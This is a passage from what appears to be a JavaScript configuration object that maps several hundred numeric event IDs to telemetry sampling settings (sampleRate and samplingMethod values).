                        "50003969": {sampleRate: 1, samplingMethod: 1},
                        "50003970": {sampleRate: 1, samplingMethod: 1},
                        "50003971": {sampleRate: 1, samplingMethod: 1},
                        "50003972": {sampleRate: 1, samplingMethod: 1},
                        "50003973": {sampleRate: 1, samplingMethod: 1},
                        "50003974": {sampleRate: 1, samplingMethod: 1},
                        "50987009": {sampleRate: 1, samplingMethod: 1},
                        "50987010": {sampleRate: 1, samplingMethod: 1},
                        "51452317": {sampleRate: 100, samplingMethod: 1},
                        "51455798": {sampleRate: 100, samplingMethod: 1},
                        "51459017": {sampleRate: 100, samplingMethod: 1},
                        "51459249": {sampleRate: 100, samplingMethod: 1},
                        "52690945": {sampleRate: 1, samplingMethod: 1},
                        "52690946": {sampleRate: 1, samplingMethod: 1},
                        "52690947": {sampleRate: 1, samplingMethod: 1},
                        "52690948": {sampleRate: 1, samplingMethod: 1},
                        "52690949": {sampleRate: 1, samplingMethod: 1},
                        "52690950": {sampleRate: 1, samplingMethod: 1},
                        "52694580": {sampleRate: 1, samplingMethod: 1},
                        "52698112": {sampleRate: 1, samplingMethod: 1},
                        "52701974": {sampleRate: 1, samplingMethod: 1},
                        "52704988": {sampleRate: 1, samplingMethod: 1},
                        "52705483": {sampleRate: 1, samplingMethod: 1},
                        "52706253": {sampleRate: 1, samplingMethod: 1},
                        "52709001": {sampleRate: 1, samplingMethod: 1},
                        "52710195": {sampleRate: 1, samplingMethod: 1},
                        "52711372": {sampleRate: 1, samplingMethod: 1},
                        "52711928": {sampleRate: 1, samplingMethod: 1},
                        "52712329": {sampleRate: 1, samplingMethod: 1},
                        "52717731": {sampleRate: 1, samplingMethod: 1},
                        "52719193": {sampleRate: 1, samplingMethod: 1},
                        "52720775": {sampleRate: 1, samplingMethod: 1},
                        "52722738": {sampleRate: 1, samplingMethod: 1},
                        "52756481": {sampleRate: 1, samplingMethod: 1},
                        "52887553": {sampleRate: 1, samplingMethod: 1},
                        "52887555": {sampleRate: 1, samplingMethod: 1},
                        "52887556": {sampleRate: 1, samplingMethod: 3},
                        "52887557": {sampleRate: 1, samplingMethod: 1},
                        "52887559": {sampleRate: 1, samplingMethod: 1},
                        "52887560": {sampleRate: 1, samplingMethod: 3},
                        "52887561": {sampleRate: 1, samplingMethod: 3},
                        "52887562": {sampleRate: 1, samplingMethod: 3},
                        "52887563": {sampleRate: 1, samplingMethod: 1},
                        "52887564": {sampleRate: 1, samplingMethod: 1},
                        "52887565": {sampleRate: 1, samplingMethod: 1},
                        "52887566": {sampleRate: 1, samplingMethod: 1},
                        "52887567": {sampleRate: 1, samplingMethod: 1},
                        "52887568": {sampleRate: 1, samplingMethod: 1},
                        "52887569": {sampleRate: 1, samplingMethod: 1},
                        "52887570": {sampleRate: 1, samplingMethod: 1},
                        "52887571": {sampleRate: 1, samplingMethod: 1},
                        "52887572": {sampleRate: 1, samplingMethod: 1},
                        "52887573": {sampleRate: 1, samplingMethod: 1},
                        "52887574": {sampleRate: 1, samplingMethod: 1},
                        "52887575": {sampleRate: 1, samplingMethod: 1},
                        "52887576": {sampleRate: 1, samplingMethod: 1},
                        "52887577": {sampleRate: 1, samplingMethod: 1},
                        "52887578": {sampleRate: 1, samplingMethod: 1},
                        "52887579": {sampleRate: 1, samplingMethod: 1},
                        "52887580": {sampleRate: 1, samplingMethod: 1},
                        "52887581": {sampleRate: 1, samplingMethod: 1},
                        "52887582": {sampleRate: 1, samplingMethod: 1},
                        "52887583": {sampleRate: 1, samplingMethod: 1},
                        "52887584": {sampleRate: 1, samplingMethod: 1},
                        "52887585": {sampleRate: 1, samplingMethod: 1},
                        "52887586": {sampleRate: 1, samplingMethod: 1},
                        "52887587": {sampleRate: 1, samplingMethod: 1},
                        "52888679": {sampleRate: 1, samplingMethod: 1},
                        "52889048": {sampleRate: 1, samplingMethod: 1},
                        "52889499": {sampleRate: 1, samplingMethod: 1},
                        "52890296": {sampleRate: 1, samplingMethod: 1},
                        "52891792": {sampleRate: 1, samplingMethod: 1},
                        "52892954": {sampleRate: 1, samplingMethod: 1},
                        "52893664": {sampleRate: 1, samplingMethod: 1},
                        "52894132": {sampleRate: 1, samplingMethod: 1},
                        "52894986": {sampleRate: 1, samplingMethod: 1},
                        "52895164": {sampleRate: 1, samplingMethod: 1},
                        "52896044": {sampleRate: 1, samplingMethod: 1},
                        "52896150": {sampleRate: 1, samplingMethod: 1},
                        "52896424": {sampleRate: 1, samplingMethod: 1},
                        "52897136": {sampleRate: 1, samplingMethod: 1},
                        "52897225": {sampleRate: 1, samplingMethod: 1},
                        "52898380": {sampleRate: 1, samplingMethod: 1},
                        "52899465": {sampleRate: 1, samplingMethod: 1},
                        "52899570": {sampleRate: 1000, samplingMethod: 1},
                        "52899642": {sampleRate: 1, samplingMethod: 1},
                        "52900219": {sampleRate: 1, samplingMethod: 1},
                        "52900550": {sampleRate: 1, samplingMethod: 1},
                        "52900739": {sampleRate: 1, samplingMethod: 1},
                        "52901539": {sampleRate: 1, samplingMethod: 1},
                        "52901642": {sampleRate: 1, samplingMethod: 1},
                        "52901931": {sampleRate: 1, samplingMethod: 1},
                        "52902102": {sampleRate: 1, samplingMethod: 1},
                        "52902805": {sampleRate: 1, samplingMethod: 1},
                        "52903035": {sampleRate: 1, samplingMethod: 1},
                        "52903160": {sampleRate: 1, samplingMethod: 1},
                        "52903192": {sampleRate: 1, samplingMethod: 1},
                        "52910634": {sampleRate: 1, samplingMethod: 1},
                        "53018625": {sampleRate: 1, samplingMethod: 1},
                        "53023044": {sampleRate: 1, samplingMethod: 1},
                        "53030147": {sampleRate: 1, samplingMethod: 1},
                        "53222086": {sampleRate: 10, samplingMethod: 1},
                        "53346305": {sampleRate: 1, samplingMethod: 1},
                        "53346306": {sampleRate: 1, samplingMethod: 1},
                        "53346307": {sampleRate: 1, samplingMethod: 1},
                        "53346308": {sampleRate: 1, samplingMethod: 3},
                        "53346309": {sampleRate: 1, samplingMethod: 1},
                        "53346310": {sampleRate: 1, samplingMethod: 1},
                        "53346311": {sampleRate: 1, samplingMethod: 1},
                        "53346312": {sampleRate: 1, samplingMethod: 1},
                        "53346313": {sampleRate: 1, samplingMethod: 1},
                        "53346314": {sampleRate: 1, samplingMethod: 1},
                        "53346315": {sampleRate: 1, samplingMethod: 1},
                        "53348255": {sampleRate: 1, samplingMethod: 1},
                        "53349360": {sampleRate: 1, samplingMethod: 1},
                        "53350227": {sampleRate: 1, samplingMethod: 1},
                        "53350607": {sampleRate: 1, samplingMethod: 1},
                        "53351604": {sampleRate: 1, samplingMethod: 1},
                        "53352841": {sampleRate: 1, samplingMethod: 1},
                        "53353549": {sampleRate: 1, samplingMethod: 1},
                        "53354745": {sampleRate: 1, samplingMethod: 1},
                        "53356071": {sampleRate: 1, samplingMethod: 1},
                        "53356872": {sampleRate: 1, samplingMethod: 1},
                        "53359547": {sampleRate: 1, samplingMethod: 1},
                        "53359965": {sampleRate: 1, samplingMethod: 1},
                        "53542913": {sampleRate: 1, samplingMethod: 1},
                        "53542914": {sampleRate: 1, samplingMethod: 1},
                        "53542915": {sampleRate: 1, samplingMethod: 1},
                        "53542916": {sampleRate: 1, samplingMethod: 1},
                        "53608449": {sampleRate: 1, samplingMethod: 1},
                        "53608450": {sampleRate: 1, samplingMethod: 1},
                        "53608451": {sampleRate: 1, samplingMethod: 1},
                        "53805057": {sampleRate: 1, samplingMethod: 1},
                        "53805058": {sampleRate: 1, samplingMethod: 1},
                        "53805059": {sampleRate: 1, samplingMethod: 1},
                        "53805060": {sampleRate: 1, samplingMethod: 1},
                        "53807173": {sampleRate: 1, samplingMethod: 1},
                        "53817004": {sampleRate: 1, samplingMethod: 1},
                        "53820636": {sampleRate: 1, samplingMethod: 1},
                        "54132737": {sampleRate: 100, samplingMethod: 1},
                        "54198273": {sampleRate: 1, samplingMethod: 1},
                        "54198274": {sampleRate: 1, samplingMethod: 1},
                        "54203833": {sampleRate: 1, samplingMethod: 1},
                        "54204699": {sampleRate: 1, samplingMethod: 1},
                        "54205001": {sampleRate: 1, samplingMethod: 1},
                        "54206020": {sampleRate: 1, samplingMethod: 1},
                        "54207975": {sampleRate: 1, samplingMethod: 1},
                        "54208795": {sampleRate: 1, samplingMethod: 1},
                        "54263809": {sampleRate: 1, samplingMethod: 1},
                        "54263810": {sampleRate: 1, samplingMethod: 1},
                        "54263811": {sampleRate: 1, samplingMethod: 1},
                        "54263812": {sampleRate: 1, samplingMethod: 1},
                        "54263813": {sampleRate: 1, samplingMethod: 1},
                        "54263814": {sampleRate: 1, samplingMethod: 1},
                        "54263815": {sampleRate: 1, samplingMethod: 1},
                        "54263816": {sampleRate: 1, samplingMethod: 1},
                        "54263817": {sampleRate: 1, samplingMethod: 1},
                        "54263818": {sampleRate: 1, samplingMethod: 1},
                        "54263819": {sampleRate: 1, samplingMethod: 1},
                        "54263820": {sampleRate: 1, samplingMethod: 1},
                        "54266075": {sampleRate: 1, samplingMethod: 1},
                        "54266141": {sampleRate: 1, samplingMethod: 1},
                        "54266824": {sampleRate: 1, samplingMethod: 1},
                        "54278955": {sampleRate: 1, samplingMethod: 1},
                        "54285047": {sampleRate: 1, samplingMethod: 1},
                        "54287428": {sampleRate: 1, samplingMethod: 1},
                        "54525953": {sampleRate: 2, samplingMethod: 1},
                        "54525954": {sampleRate: 1, samplingMethod: 1},
                        "54525955": {sampleRate: 1, samplingMethod: 1},
                        "54525956": {sampleRate: 1, samplingMethod: 1},
                        "54525957": {sampleRate: 1, samplingMethod: 1},
                        "54525958": {sampleRate: 1, samplingMethod: 1},
                        "54525959": {sampleRate: 1, samplingMethod: 1},
                        "54657025": {sampleRate: 10000, samplingMethod: 1},
                        "54657026": {sampleRate: 10000, samplingMethod: 1},
                        "54657027": {sampleRate: 10000, samplingMethod: 1},
                        "54657028": {sampleRate: 10000, samplingMethod: 1},
                        "54657029": {sampleRate: 10000, samplingMethod: 1},
                        "54657030": {sampleRate: 10000, samplingMethod: 1},
                        "54853633": {sampleRate: 1, samplingMethod: 1},
                        "54853634": {sampleRate: 1, samplingMethod: 1},
                        "54856934": {sampleRate: 1, samplingMethod: 1},
                        "54864546": {sampleRate: 1, samplingMethod: 1},
                        "54919169": {sampleRate: 1, samplingMethod: 1},
                        "54919170": {sampleRate: 1, samplingMethod: 1},
                        "54919171": {sampleRate: 1, samplingMethod: 1},
                        "54919172": {sampleRate: 1, samplingMethod: 1},
                        "54919173": {sampleRate: 1, samplingMethod: 1},
                        "54919174": {sampleRate: 1, samplingMethod: 1},
                        "54919175": {sampleRate: 1, samplingMethod: 1},
                        "54919176": {sampleRate: 1, samplingMethod: 1},
                        "54919177": {sampleRate: 1, samplingMethod: 1},
                        "54919178": {sampleRate: 1, samplingMethod: 1},
                        "54919179": {sampleRate: 1, samplingMethod: 1},
                        "54919180": {sampleRate: 1, samplingMethod: 1},
                        "54919181": {sampleRate: 1, samplingMethod: 1},
                        "54919182": {sampleRate: 1, samplingMethod: 1},
                        "54919183": {sampleRate: 1, samplingMethod: 1},
                        "54919184": {sampleRate: 1, samplingMethod: 1},
                        "54919185": {sampleRate: 1, samplingMethod: 1},
                        "54919186": {sampleRate: 1, samplingMethod: 1},
                        "54919187": {sampleRate: 1, samplingMethod: 1},
                        "54919188": {sampleRate: 1, samplingMethod: 1},
                        "54919189": {sampleRate: 1, samplingMethod: 1},
                        "54919190": {sampleRate: 1, samplingMethod: 1},
                        "54919191": {sampleRate: 1, samplingMethod: 1},
                        "54919192": {sampleRate: 1, samplingMethod: 1},
                        "54919193": {sampleRate: 1, samplingMethod: 1},
                        "54919194": {sampleRate: 1, samplingMethod: 1},
                        "54919195": {sampleRate: 1, samplingMethod: 1},
                        "54919196": {sampleRate: 1, samplingMethod: 1},
                        "54919197": {sampleRate: 1, samplingMethod: 1},
                        "54919198": {sampleRate: 1, samplingMethod: 1},
                        "54919199": {sampleRate: 1, samplingMethod: 1},
                        "54920477": {sampleRate: 1, samplingMethod: 1},
                        "54920986": {sampleRate: 1, samplingMethod: 1},
                        "54921638": {sampleRate: 1, samplingMethod: 1},
                        "54922073": {sampleRate: 1, samplingMethod: 1},
                        "54922991": {sampleRate: 1, samplingMethod: 1},
                        "54923806": {sampleRate: 1, samplingMethod: 1},
                        "54924465": {sampleRate: 1, samplingMethod: 1},
                        "54924629": {sampleRate: 1, samplingMethod: 1},
                        "54926560": {sampleRate: 1, samplingMethod: 1},
                        "54927157": {sampleRate: 1, samplingMethod: 1},
                        "54928097": {sampleRate: 1, samplingMethod: 1},
                        "54928841": {sampleRate: 1, samplingMethod: 1},
                        "54930074": {sampleRate: 1, samplingMethod: 1},
                        "54930508": {sampleRate: 1, samplingMethod: 1},
                        "54932258": {sampleRate: 1, samplingMethod: 1},
                        "54934991": {sampleRate: 1, samplingMethod: 1},
                        "54935139": {sampleRate: 1, samplingMethod: 1},
                        "54935506": {sampleRate: 1, samplingMethod: 1},
                        "55181314": {sampleRate: 1, samplingMethod: 1},
                        "55181315": {sampleRate: 1, samplingMethod: 1},
                        "55181316": {sampleRate: 1, samplingMethod: 1},
                        "55181317": {sampleRate: 1, samplingMethod: 1},
                        "55246849": {sampleRate: 1, samplingMethod: 1},
                        "55246850": {sampleRate: 1000000000, samplingMethod: 1},
                        "55312385": {sampleRate: 1, samplingMethod: 1},
                        "55312386": {sampleRate: 1, samplingMethod: 1},
                        "55312388": {sampleRate: 1, samplingMethod: 1},
                        "55325709": {sampleRate: 1, samplingMethod: 1},
                        "55443457": {sampleRate: 1, samplingMethod: 1},
                        "55443458": {sampleRate: 1, samplingMethod: 1},
                        "55443459": {sampleRate: 1, samplingMethod: 1},
                        "55443460": {sampleRate: 1, samplingMethod: 1},
                        "55447349": {sampleRate: 1, samplingMethod: 1},
                        "55465642": {sampleRate: 1, samplingMethod: 1},
                        "55508994": {sampleRate: 1, samplingMethod: 1},
                        "55508995": {sampleRate: 1, samplingMethod: 1},
                        "55508996": {sampleRate: 1, samplingMethod: 1},
                        "55511587": {sampleRate: 1, samplingMethod: 1},
                        "55517182": {sampleRate: 1, samplingMethod: 1},
                        "55574529": {sampleRate: 10000, samplingMethod: 1},
                        "55574530": {sampleRate: 1, samplingMethod: 3},
                        "55577701": {sampleRate: 1, samplingMethod: 3},
                        "55580822": {sampleRate: 1, samplingMethod: 3},
                        "55836673": {sampleRate: 1, samplingMethod: 1},
                        "55836674": {sampleRate: 1000000000, samplingMethod: 1},
                        "55836675": {sampleRate: 1000000000, samplingMethod: 1},
                        "55836676": {sampleRate: 1000000000, samplingMethod: 1},
                        "55836677": {sampleRate: 1000000000, samplingMethod: 1},
                        "55836678": {sampleRate: 10000, samplingMethod: 1},
                        "55838299": {sampleRate: 1, samplingMethod: 1},
                        "55838475": {sampleRate: 10000, samplingMethod: 1},
                        "55838751": {sampleRate: 1, samplingMethod: 1},
                        "55839297": {sampleRate: 1, samplingMethod: 1},
                        "55839576": {sampleRate: 1, samplingMethod: 1},
                        "55967745": {sampleRate: 1, samplingMethod: 1},
                        "55967746": {sampleRate: 1, samplingMethod: 1},
                        "55967747": {sampleRate: 1, samplingMethod: 1},
                        "55967748": {sampleRate: 1, samplingMethod: 1},
                        "55977618": {sampleRate: 1, samplingMethod: 1},
                        "55981862": {sampleRate: 1, samplingMethod: 1},
                        "55983494": {sampleRate: 1, samplingMethod: 1},
                        "56360961": {sampleRate: 1, samplingMethod: 1},
                        "57344001": {sampleRate: 1, samplingMethod: 1},
                        "57344002": {sampleRate: 10, samplingMethod: 1},
                        "57344003": {sampleRate: 1, samplingMethod: 1},
                        "57344004": {sampleRate: 1, samplingMethod: 1},
                        "57344005": {sampleRate: 10000, samplingMethod: 1},
                        "57349022": {sampleRate: 10000, samplingMethod: 1},
                        "57409537": {sampleRate: 100000000, samplingMethod: 1},
                        "57409538": {sampleRate: 100000000, samplingMethod: 1},
                        "57409539": {sampleRate: 100000000, samplingMethod: 1},
                        "57414808": {sampleRate: 10000, samplingMethod: 1},
                        "57416887": {sampleRate: 10000, samplingMethod: 1},
                        "57423572": {sampleRate: 10000, samplingMethod: 1},
                        "57424600": {sampleRate: 10000, samplingMethod: 1},
                        "57553537": {sampleRate: 1, samplingMethod: 1},
                        "57671681": {sampleRate: 1, samplingMethod: 1},
                        "57671682": {sampleRate: 1, samplingMethod: 1},
                        "57671683": {sampleRate: 1, samplingMethod: 1},
                        "57671684": {sampleRate: 1, samplingMethod: 1},
                        "57671685": {sampleRate: 1, samplingMethod: 1},
                        "57673015": {sampleRate: 1, samplingMethod: 1},
                        "57673101": {sampleRate: 1, samplingMethod: 1},
                        "57676191": {sampleRate: 1, samplingMethod: 1},
                        "57676962": {sampleRate: 1, samplingMethod: 1},
                        "57678366": {sampleRate: 1, samplingMethod: 1},
                        "57679159": {sampleRate: 1, samplingMethod: 1},
                        "57679681": {sampleRate: 1, samplingMethod: 1},
                        "57680423": {sampleRate: 1, samplingMethod: 1},
                        "57681719": {sampleRate: 1, samplingMethod: 1},
                        "57933825": {sampleRate: 1, samplingMethod: 1},
                        "57999361": {sampleRate: 1, samplingMethod: 1},
                        "57999362": {sampleRate: 1, samplingMethod: 1},
                        "58195969": {sampleRate: 1, samplingMethod: 1},
                        "58195970": {sampleRate: 1, samplingMethod: 1},
                        "58195971": {sampleRate: 1, samplingMethod: 1},
                        "58197575": {sampleRate: 1, samplingMethod: 1},
                        "58198230": {sampleRate: 1, samplingMethod: 1},
                        "58198910": {sampleRate: 1, samplingMethod: 1},
                        "58199413": {sampleRate: 1, samplingMethod: 1},
                        "58200119": {sampleRate: 1, samplingMethod: 1},
                        "58200302": {sampleRate: 1, samplingMethod: 1},
                        "58202054": {sampleRate: 1, samplingMethod: 1},
                        "58203187": {sampleRate: 1, samplingMethod: 1},
                        "58203836": {sampleRate: 1, samplingMethod: 1},
                        "58204710": {sampleRate: 1, samplingMethod: 1},
                        "58204719": {sampleRate: 1, samplingMethod: 1},
                        "58204796": {sampleRate: 1, samplingMethod: 1},
                        "58204895": {sampleRate: 1, samplingMethod: 1},
                        "58205292": {sampleRate: 1, samplingMethod: 1},
                        "58207372": {sampleRate: 1, samplingMethod: 1},
                        "58207791": {sampleRate: 1, samplingMethod: 1},
                        "58208472": {sampleRate: 1, samplingMethod: 1},
                        "58208772": {sampleRate: 1, samplingMethod: 1},
                        "58209045": {sampleRate: 1, samplingMethod: 1},
                        "58209083": {sampleRate: 1, samplingMethod: 1},
                        "58209723": {sampleRate: 1, samplingMethod: 1},
                        "58209742": {sampleRate: 1, samplingMethod: 1},
                        "58210323": {sampleRate: 1, samplingMethod: 1},
                        "58210485": {sampleRate: 1, samplingMethod: 1},
                        "58210711": {sampleRate: 1, samplingMethod: 1},
                        "58211469": {sampleRate: 1, samplingMethod: 1},
                        "58211715": {sampleRate: 1, samplingMethod: 1},
                        "58211900": {sampleRate: 1, samplingMethod: 1},
                        "58458114": {sampleRate: 1, samplingMethod: 1},
                        "58458115": {sampleRate: 1, samplingMethod: 1},
                        "58461407": {sampleRate: 1, samplingMethod: 1},
                        "58464469": {sampleRate: 1, samplingMethod: 1},
                        "58471621": {sampleRate: 1, samplingMethod: 1},
                        "58654721": {sampleRate: 1, samplingMethod: 1},
                        "58654722": {sampleRate: 1, samplingMethod: 1},
                        "58654723": {sampleRate: 1, samplingMethod: 1},
                        "59244545": {sampleRate: 1, samplingMethod: 1},
                        "59244546": {sampleRate: 1, samplingMethod: 1},
                        "59249609": {sampleRate: 1, samplingMethod: 1},
                        "59251734": {sampleRate: 1, samplingMethod: 1},
                        "59255771": {sampleRate: 1, samplingMethod: 1},
                        "59506689": {sampleRate: 10000, samplingMethod: 1},
                        "59899905": {sampleRate: 1, samplingMethod: 1},
                        "59899906": {sampleRate: 1, samplingMethod: 1},
                        "59899907": {sampleRate: 1, samplingMethod: 1},
                        "59899908": {sampleRate: 1, samplingMethod: 1},
                        "59899909": {sampleRate: 1, samplingMethod: 1},
                        "61276161": {sampleRate: 1, samplingMethod: 1},
                        "61276162": {sampleRate: 1, samplingMethod: 1},
                        "61276163": {sampleRate: 1, samplingMethod: 1},
                        "61276164": {sampleRate: 1, samplingMethod: 1},
                        "62128129": {sampleRate: 1, samplingMethod: 1},
                        "62128130": {sampleRate: 1, samplingMethod: 1},
                        "62128131": {sampleRate: 1, samplingMethod: 1},
                        "62128132": {sampleRate: 1, samplingMethod: 1},
                        "62128133": {sampleRate: 1, samplingMethod: 1},
                        "62128134": {sampleRate: 1, samplingMethod: 1},
                        "62128135": {sampleRate: 1, samplingMethod: 1},
                        "62324739": {sampleRate: 1, samplingMethod: 1},
                        "62455809": {sampleRate: 1, samplingMethod: 1},
                        "62455810": {sampleRate: 1, samplingMethod: 1},
                        "62455811": {sampleRate: 1, samplingMethod: 1},
                        "62521345": {sampleRate: 10, samplingMethod: 1},
                        "62521346": {sampleRate: 10, samplingMethod: 1},
                        "62521347": {sampleRate: 10, samplingMethod: 1},
                        "62521348": {sampleRate: 10, samplingMethod: 1},
                        "62521349": {sampleRate: 10, samplingMethod: 1},
                        "62521350": {sampleRate: 10, samplingMethod: 1},
                        "62532802": {sampleRate: 10, samplingMethod: 1},
                        "62586881": {sampleRate: 10, samplingMethod: 1},
                        "62914562": {sampleRate: 1, samplingMethod: 1},
                        "62980097": {sampleRate: 10000, samplingMethod: 1},
                        "63373313": {sampleRate: 1, samplingMethod: 1},
                        "63438849": {sampleRate: 1, samplingMethod: 1},
                        "63443246": {sampleRate: 1, samplingMethod: 1},
                        "63443755": {sampleRate: 1, samplingMethod: 1},
                        "63444114": {sampleRate: 1, samplingMethod: 1},
                        "63445172": {sampleRate: 1, samplingMethod: 1},
                        "63451466": {sampleRate: 1, samplingMethod: 1},
                        "63504385": {sampleRate: 1, samplingMethod: 1},
                        "63504386": {sampleRate: 1, samplingMethod: 1},
                        "63504387": {sampleRate: 1, samplingMethod: 1},
                        "63569921": {sampleRate: 1, samplingMethod: 1},
                        "63635457": {sampleRate: 1, samplingMethod: 1},
                        "63700993": {sampleRate: 1, samplingMethod: 1},
                        "63700994": {sampleRate: 1, samplingMethod: 1},
                        "63700995": {sampleRate: 1, samplingMethod: 1},
                        "63700996": {sampleRate: 1, samplingMethod: 1},
                        "63700997": {sampleRate: 1, samplingMethod: 1},
                        "63963137": {sampleRate: 1, samplingMethod: 1},
                        "64044054": {sampleRate: 10000, samplingMethod: 1},
                        "64230141": {sampleRate: 10000, samplingMethod: 1},
                        "64232355": {sampleRate: 10000, samplingMethod: 1},
                        "64233826": {sampleRate: 10000, samplingMethod: 1},
                        "64240099": {sampleRate: 10000, samplingMethod: 1},
                        "75366401": {sampleRate: 10000, samplingMethod: 1},
                        "79364097": {sampleRate: 1, samplingMethod: 1},
                        "81599639": {sampleRate: 10000, samplingMethod: 1},
                        "81601374": {sampleRate: 10000, samplingMethod: 1},
                        "81607290": {sampleRate: 10000, samplingMethod: 1},
                        "81725894": {sampleRate: 10000, samplingMethod: 1},
                        "81735603": {sampleRate: 10000, samplingMethod: 1},
                        "81739010": {sampleRate: 10000, samplingMethod: 1},
                        "91490110": {sampleRate: 1, samplingMethod: 1},
                        "91493742": {sampleRate: 1, samplingMethod: 1},
                        "91497584": {sampleRate: 1, samplingMethod: 1},
                        "91500519": {sampleRate: 1, samplingMethod: 1},
                        "91501860": {sampleRate: 1, samplingMethod: 1},
                        "95289345": {sampleRate: 10000, samplingMethod: 1},
                        "96997416": {sampleRate: 10000, samplingMethod: 1},
                        "97584737": {sampleRate: 1, samplingMethod: 3},
                        "97586489": {sampleRate: 1, samplingMethod: 3},
                        "97590506": {sampleRate: 1, samplingMethod: 3},
                        "97590967": {sampleRate: 10000, samplingMethod: 1},
                        "97595254": {sampleRate: 1, samplingMethod: 3},
                        "97596530": {sampleRate: 1, samplingMethod: 3},
                        "97598603": {sampleRate: 1, samplingMethod: 3},
                        "101648941": {sampleRate: 1, samplingMethod: 1},
                        "101652143": {sampleRate: 1, samplingMethod: 1},
                        "101655997": {sampleRate: 1, samplingMethod: 1},
                        "101657336": {sampleRate: 1, samplingMethod: 1},
                        "101657509": {sampleRate: 1, samplingMethod: 1},
                        "104857601": {sampleRate: 10000, samplingMethod: 1},
                        "104857602": {sampleRate: 10000, samplingMethod: 1},
                        "108079481": {sampleRate: 10000, samplingMethod: 1},
                        "109772801": {sampleRate: 1, samplingMethod: 1},
                        "109774781": {sampleRate: 1, samplingMethod: 1},
                        "109774948": {sampleRate: 1, samplingMethod: 1},
                        "109775850": {sampleRate: 1, samplingMethod: 1},
                        "109775999": {sampleRate: 1, samplingMethod: 1},
                        "109776315": {sampleRate: 1, samplingMethod: 1},
                        "109777419": {sampleRate: 1, samplingMethod: 1},
                        "109777541": {sampleRate: 1, samplingMethod: 1},
                        "109780893": {sampleRate: 1, samplingMethod: 1},
                        "109781457": {sampleRate: 1, samplingMethod: 1},
                        "109782244": {sampleRate: 1, samplingMethod: 1},
                        "109782888": {sampleRate: 1, samplingMethod: 1},
                        "109784985": {sampleRate: 1, samplingMethod: 1},
                        "109785685": {sampleRate: 1, samplingMethod: 1},
                        "109787338": {sampleRate: 1, samplingMethod: 1},
                        "110176278": {sampleRate: 1, samplingMethod: 1},
                        "110177888": {sampleRate: 1, samplingMethod: 1},
                        "110178557": {sampleRate: 1, samplingMethod: 1},
                        "112991659": {sampleRate: 1, samplingMethod: 1},
                        "112992363": {sampleRate: 1, samplingMethod: 1},
                        "124985766": {sampleRate: 1, samplingMethod: 1},
                        "124989707": {sampleRate: 1, samplingMethod: 3},
                        "127468755": {sampleRate: 1, samplingMethod: 1},
                        "127468795": {sampleRate: 1, samplingMethod: 1},
                        "127469845": {sampleRate: 1, samplingMethod: 1},
                        "127470547": {sampleRate: 1, samplingMethod: 1},
                        "127470924": {sampleRate: 1, samplingMethod: 1},
                        "127471679": {sampleRate: 1, samplingMethod: 1},
                        "127471680": {sampleRate: 1, samplingMethod: 1},
                        "127473053": {sampleRate: 1, samplingMethod: 1},
                        "127474327": {sampleRate: 1, samplingMethod: 1},
                        "127474527": {sampleRate: 1, samplingMethod: 1},
                        "127477457": {sampleRate: 1, samplingMethod: 1},
                        "127481618": {sampleRate: 1, samplingMethod: 1},
                        "127481936": {sampleRate: 1, samplingMethod: 1},
                        "127483160": {sampleRate: 1, samplingMethod: 1},
                        "137428993": {sampleRate: 1, samplingMethod: 1},
                        "137428994": {sampleRate: 1, samplingMethod: 1},
                        "137440519": {sampleRate: 1, samplingMethod: 1},
                        "138810076": {sampleRate: 1, samplingMethod: 1},
                        "138816378": {sampleRate: 1, samplingMethod: 1},
                        "138820675": {sampleRate: 1, samplingMethod: 1},
                        "141363848": {sampleRate: 1, samplingMethod: 1},
                        "141372740": {sampleRate: 1, samplingMethod: 1},
                        "141492225": {sampleRate: 1, samplingMethod: 1},
                        "141502565": {sampleRate: 1, samplingMethod: 1},
                        "144444239": {sampleRate: 1, samplingMethod: 1},
                        "144445421": {sampleRate: 1, samplingMethod: 1},
                        "144450614": {sampleRate: 1, samplingMethod: 1},
                        "144452084": {sampleRate: 1, samplingMethod: 1},
                        "144452614": {sampleRate: 1, samplingMethod: 1},
                        "144456097": {sampleRate: 1, samplingMethod: 1},
                        "144456247": {sampleRate: 1, samplingMethod: 1},
                        "154664961": {sampleRate: 10000, samplingMethod: 1},
                        "154664962": {sampleRate: 10000, samplingMethod: 1},
                        "159779919": {sampleRate: 1, samplingMethod: 1},
                        "163841330": {sampleRate: 1, samplingMethod: 1},
                        "163842200": {sampleRate: 10000, samplingMethod: 1},
                        "163842926": {sampleRate: 1, samplingMethod: 1},
                        "163843192": {sampleRate: 10, samplingMethod: 1},
                        "163843810": {sampleRate: 10, samplingMethod: 1},
                        "163844026": {sampleRate: 1, samplingMethod: 1},
                        "163845835": {sampleRate: 10000, samplingMethod: 1},
                        "163846803": {sampleRate: 1, samplingMethod: 1},
                        "163846904": {sampleRate: 1, samplingMethod: 1},
                        "163847018": {sampleRate: 10000, samplingMethod: 1},
                        "163847262": {sampleRate: 10000, samplingMethod: 1},
                        "163847763": {sampleRate: 1000, samplingMethod: 1},
                        "163849766": {sampleRate: 100, samplingMethod: 1},
                        "163850223": {sampleRate: 1, samplingMethod: 1},
                        "163850474": {sampleRate: 1, samplingMethod: 1},
                        "163853979": {sampleRate: 1, samplingMethod: 1},
                        "163854950": {sampleRate: 10000, samplingMethod: 1},
                        "163855787": {sampleRate: 10, samplingMethod: 1},
                        "163855825": {sampleRate: 10000, samplingMethod: 1},
                        "178199990": {sampleRate: 10000, samplingMethod: 1},
                        "178200683": {sampleRate: 10000, samplingMethod: 1},
                        "183767196": {sampleRate: 1, samplingMethod: 1},
                        "183834837": {sampleRate: 10000, samplingMethod: 1},
                        "188746120": {sampleRate: 10000, samplingMethod: 1},
                        "188755890": {sampleRate: 10000, samplingMethod: 1},
                        "188755925": {sampleRate: 10000, samplingMethod: 1},
                        "192872449": {sampleRate: 1, samplingMethod: 1},
                        "195562276": {sampleRate: 1, samplingMethod: 1},
                        "195563247": {sampleRate: 1, samplingMethod: 1},
                        "195626194": {sampleRate: 1, samplingMethod: 1},
                        "195639692": {sampleRate: 1, samplingMethod: 1},
                        "204155936": {sampleRate: 1, samplingMethod: 1},
                        "205198634": {sampleRate: 1, samplingMethod: 1},
                        "205207410": {sampleRate: 1, samplingMethod: 1},
                        "209979636": {sampleRate: 1, samplingMethod: 1},
                        "209989735": {sampleRate: 1, samplingMethod: 1},
                        "213129059": {sampleRate: 1, samplingMethod: 1},
                        "213130080": {sampleRate: 1, samplingMethod: 1},
                        "213131472": {sampleRate: 1, samplingMethod: 1},
                        "213135039": {sampleRate: 1, samplingMethod: 1},
                        "216401752": {sampleRate: 1, samplingMethod: 1},
                        "216401890": {sampleRate: 1, samplingMethod: 1},
